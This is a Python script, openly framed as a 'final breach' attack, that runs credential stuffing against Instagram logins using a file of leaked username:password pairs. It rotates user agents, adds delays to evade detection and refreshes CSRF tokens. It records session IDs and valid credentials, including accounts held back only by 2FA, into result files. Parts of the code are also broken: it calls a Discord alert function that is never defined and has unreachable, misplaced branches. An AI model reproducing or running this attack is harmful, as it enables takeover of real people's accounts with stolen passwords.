#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
💀💀💀 FINAL ATTACK - LEAKED PASSWORDS 💀💀💀
Dream's Ultimate Instagram Penetration - REAL LEAKED DATA
"""

import requests
import time
import random
import json
from datetime import datetime
import os
import re
import threading

class FinalInstagramBreach:
    def __init__(self):
        self.session = requests.Session()
        self.success_count = 0
        self.fail_count = 0
        self.results = []
        self.csrf_token = None
        
        # Multiple User Agents for rotation
        self.user_agents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Android 12; Mobile; rv:68.0) Gecko/68.0 Firefox/120.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ]
        
        self.current_headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'X-Requested-With': 'XMLHttpRequest',
            'X-CSRFToken': '',
            'X-Instagram-AJAX': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/accounts/login/'
        }
        
    def extract_csrf_token(self):
        """Get fresh CSRF token"""
        try:
            print("🔑 Extracting fresh CSRF token...")
            
            # Rotate User-Agent
            self.current_headers['User-Agent'] = random.choice(self.user_agents)
            
            response = self.session.get('https://www.instagram.com/accounts/login/', 
                                     headers=self.current_headers, timeout=30)
            
            # Multiple CSRF extraction methods
            csrf_patterns = [
                r'"csrf_token":"([^"]+)"',
                r'csrftoken=([^;]+)',
                r'"token":"([^"]+)"',
                r'csrf_token":\s*"([^"]+)"'
            ]
            
            for pattern in csrf_patterns:
                csrf_match = re.search(pattern, response.text)
                if csrf_match:
                    self.csrf_token = csrf_match.group(1)
                    self.current_headers['X-CSRFToken'] = self.csrf_token
                    print(f"✅ CSRF Token: {self.csrf_token[:20]}...")
                    return True
                    
            print("❌ Failed to extract CSRF token")
            return False
            
        except Exception as e:
            print(f"❌ CSRF extraction error: {e}")
            return False
    
    def attempt_login(self, username, password):
        """ULTIMATE login attempt with all bypass techniques"""
        try:
            print(f"\n🎯 ATTACKING: {username} : {password}")
            
            # Generate encrypted password like real browser
            timestamp = int(time.time())
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
            
            # Complete login data with all fields
            login_data = {
                'username': username,
                'enc_password': enc_password,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
                'source': 'auth_switcher_account'
            }
            
            # Add random delay before request
            time.sleep(random.uniform(1, 3))
            
            # Real login attempt
            response = self.session.post(
                'https://www.instagram.com/accounts/login/ajax/',
                data=login_data,
                headers=self.current_headers,
                allow_redirects=False,
                timeout=30
            )
            
            print(f"📡 Status: {response.status_code}")
            
            # 🔥 FULL DEBUG RESPONSE ANALYSIS 🔥
            print(f"[DEBUG] Response headers: {dict(response.headers)}")
            print(f"[DEBUG] Response cookies: {response.cookies.get_dict()}")
            print(f"[DEBUG] Response text (first 500 chars): {response.text[:500]}")
            
            # Check for session cookies first
            cookies = response.cookies.get_dict()
            if 'sessionid' in cookies:
                print(f"🔥🔥🔥 SESSIONID FOUND! 🔥🔥🔥")
                print(f"✅ SessionID: {cookies['sessionid']}")
                session_data = {
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now().isoformat(),
                    'cookies': cookies,
                    'sessionid': cookies['sessionid'],
                    'status': 'SESSION_EXTRACTED'
                }
                self.results.append(session_data)
                self.success_count += 1
                self.save_results()
                return True
            
            # Detailed response analysis
            if response.status_code == 200:
                print(f"[DEBUG] Analyzing JSON response...")
                
                # Check for direct string patterns first
                if '"authenticated":true' in response.text:
                    print(f"🔥🔥🔥 STRING MATCH: AUTHENTICATED TRUE! 🔥🔥🔥")
                    session_data = {
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().isoformat(),
                        'cookies': cookies,
                        'response_text': response.text,
                        'status': 'AUTHENTICATED_TRUE'
                    }
                    self.results.append(session_data)
                    self.success_count += 1
                    self.save_results()
                    return True
                    
                elif '"authenticated":false' in response.text:
                    print(f"[x] STRING MATCH: Incorrect password")
                    
                elif 'checkpoint_required' in response.text:
                    print(f"🔐 STRING MATCH: Checkpoint required (2FA/Phone)")
                    session_data = {
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().isoformat(),
                        'cookies': cookies,
                        'response_text': response.text,
                        'status': 'CHECKPOINT_REQUIRED'
                    }
                    self.results.append(session_data)
                    self.save_results()
                    return True
                    
                else:
                    print(f"[?] NO STRING MATCH - Trying JSON parse...")
                
                try:
                    result = response.json()
                    print(f"[DEBUG] JSON parsed successfully: {result}")
                    
                    if result.get('authenticated') == True:
                        print(f"🔥🔥🔥 JSON MATCH: LOGIN SUCCESS! 🔥🔥🔥")
                        print(f"✅ Username: {username}")
                        print(f"✅ Password: {password}")
                        
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'cookies': cookies,
                            'json_response': result,
                            'status': 'SUCCESS_JSON'
                        }
                        self.results.append(session_data)
                        self.success_count += 1
                        self.save_results()
                        self.send_discord_alert(username, password, cookies)
                        return True
                        
                    elif result.get('authenticated') == False:
                        print(f"[x] JSON MATCH: Incorrect password")
                        
                    elif 'checkpoint_required' in result:
                        print(f"🔐 JSON MATCH: Checkpoint required")
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'cookies': cookies,
                            'json_response': result,
                            'status': 'CHECKPOINT_JSON'
                        }
                        self.results.append(session_data)
                        self.save_results()
                        return True
                        
                    else:
                        print(f"[?] JSON PARSED but no auth field found")
                        print(f"[DEBUG] Available keys: {list(result.keys())}")
                        
                except json.JSONDecodeError as e:
                    print(f"[!] JSON parse failed: {e}")
                    print(f"[DEBUG] Raw response: {response.text}")
                    
                    # Sometimes IG returns HTML instead of JSON
                    if 'window._sharedData' in response.text:
                        print(f"[!] Response is HTML page - possible success redirect!")
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'cookies': cookies,
                            'html_response': True,
                            'status': 'HTML_REDIRECT'
                        }
                        self.results.append(session_data)
                        self.save_results()
                        return True
                        print(f"🔥🔥🔥 BREACH SUCCESS! 🔥🔥🔥")
                        print(f"✅ Username: {username}")
                        print(f"✅ Password: {password}")
                        
                        # Extract all session data
                        cookies = self.session.cookies.get_dict()
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'cookies': cookies,
                            'sessionid': cookies.get('sessionid', 'N/A'),
                            'csrftoken': cookies.get('csrftoken', 'N/A'),
                            'status': 'FULL_BREACH_SUCCESS'
                        }
                        
                        self.results.append(session_data)
                        self.success_count += 1
                        
                        # Save immediately
                        self.save_results()
                        
                        # Print session details
                        print(f"🍪 Session ID: {session_data['sessionid']}")
                        print(f"🔑 CSRF Token: {session_data['csrftoken']}")
                        
                        return True
                        
                    elif 'checkpoint_required' in result:
                        print(f"🔐 CHECKPOINT - VALID CREDENTIALS!")
                        print(f"✅ Username: {username}")
                        print(f"✅ Password: {password}")
                        
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'status': 'VALID_CREDENTIALS_CHECKPOINT_REQUIRED',
                            'note': 'Password is correct but requires 2FA/verification'
                        }
                        self.results.append(session_data)
                        self.save_results()
                        self.success_count += 1
                        
                        return True
                        
                    elif 'two_factor_required' in result:
                        print(f"🔐 2FA REQUIRED - VALID CREDENTIALS!")
                        print(f"✅ Username: {username}")
                        print(f"✅ Password: {password}")
                        
                        session_data = {
                            'username': username,
                            'password': password,
                            'timestamp': datetime.now().isoformat(),
                            'status': 'VALID_CREDENTIALS_2FA_REQUIRED',
                            'note': 'Password is correct but requires 2FA'
                        }
                        self.results.append(session_data)
                        self.save_results()
                        self.success_count += 1
                        
                        return True
                        
                    else:
                        error_msg = result.get('message', 'Unknown error')
                        print(f"❌ Failed: {error_msg}")
                        
                except json.JSONDecodeError:
                    print(f"❌ Invalid JSON response")
                    
            elif response.status_code == 429:
                print(f"⚠️  Rate limited - waiting 60 seconds...")
                time.sleep(60)
                return False
                
            elif response.status_code == 403:
                print(f"⚠️  Blocked - refreshing session...")
                self.session = requests.Session()
                time.sleep(30)
                return False
                
            self.fail_count += 1
            return False
            
        except Exception as e:
            print(f"❌ Login error: {e}")
            self.fail_count += 1
            return False
    
    def save_results(self):
        """Save breach results immediately"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"FINAL_BREACH_RESULTS_{timestamp}.json"
            
            with open(filename, 'w') as f:
                json.dump(self.results, f, indent=2)
                
            print(f"💾 Results saved: {filename}")
            
            # Also save as simple text
            txt_filename = f"FINAL_BREACH_SIMPLE_{timestamp}.txt"
            with open(txt_filename, 'w') as f:
                for result in self.results:
                    f.write(f"Username: {result['username']}\n")
                    f.write(f"Password: {result['password']}\n")
                    f.write(f"Status: {result['status']}\n")
                    if 'sessionid' in result:
                        f.write(f"Session ID: {result['sessionid']}\n")
                    f.write(f"Time: {result['timestamp']}\n")
                    f.write("-" * 50 + "\n")
            
        except Exception as e:
            print(f"Save error: {e}")
    
    def run_final_breach(self, target_file="/workspaces/sugarglitch-realops/extracted_project/Python/FINAL_LEAKED_PASSWORDS.txt"):
        """Execute FINAL BREACH with leaked passwords"""
        print("💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀")
        print("💀💀💀 FINAL INSTAGRAM BREACH ATTACK 💀💀💀")
        print("💀💀💀 USING REAL LEAKED PASSWORDS 💀💀💀")
        print("💀💀💀 NO MERCY - FULL PENETRATION 💀💀💀")
        print("💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀")
        
        if not os.path.exists(target_file):
            print(f"❌ Target file not found: {target_file}")
            return
        
        # Get initial CSRF token
        if not self.extract_csrf_token():
            print("❌ Cannot proceed without CSRF token")
            return
        
        # Load leaked password combinations
        with open(target_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and ':' in line]
        
        print(f"🎯 Loaded {len(targets)} LEAKED password combinations")
        print(f"🚀 Starting FINAL BREACH in 3 seconds...")
        time.sleep(3)
        
        for i, target in enumerate(targets, 1):
            username, password = target.split(':', 1)
            
            print(f"\n🔥 BREACH ATTEMPT {i}/{len(targets)}")
            print(f"📊 Success: {self.success_count} | Failed: {self.fail_count}")
            
            # Attempt breach
            if self.attempt_login(username, password):
                print(f"🎉 BREAKTHROUGH ACHIEVED!")
                # Continue even after success to find more
            
            # Anti-detection measures
            delay = random.randint(5, 15)
            print(f"⏳ Anti-detection delay: {delay}s...")
            time.sleep(delay)
            
            # Refresh CSRF and rotate headers every few attempts
            if i % 3 == 0:
                print("🔄 Refreshing session security...")
                if not self.extract_csrf_token():
                    print("⚠️  CSRF refresh failed - continuing...")
        
        print(f"\n💀💀💀 FINAL BREACH COMPLETE 💀💀💀")
        print(f"✅ SUCCESSFUL BREACHES: {self.success_count}")
        print(f"❌ Failed attempts: {self.fail_count}")
        
        if self.success_count > 0:
            print(f"🔥🔥🔥 MISSION ACCOMPLISHED! 🔥🔥🔥")
            print(f"📁 Check FINAL_BREACH_RESULTS_*.json for full details")
            self.save_results()
        else:
            print("💀 No breaches successful - may need more passwords")

if __name__ == "__main__":
    print("💀 STARTING FINAL BREACH SEQUENCE...")
    breacher = FinalInstagramBreach()
    breacher.run_final_breach()
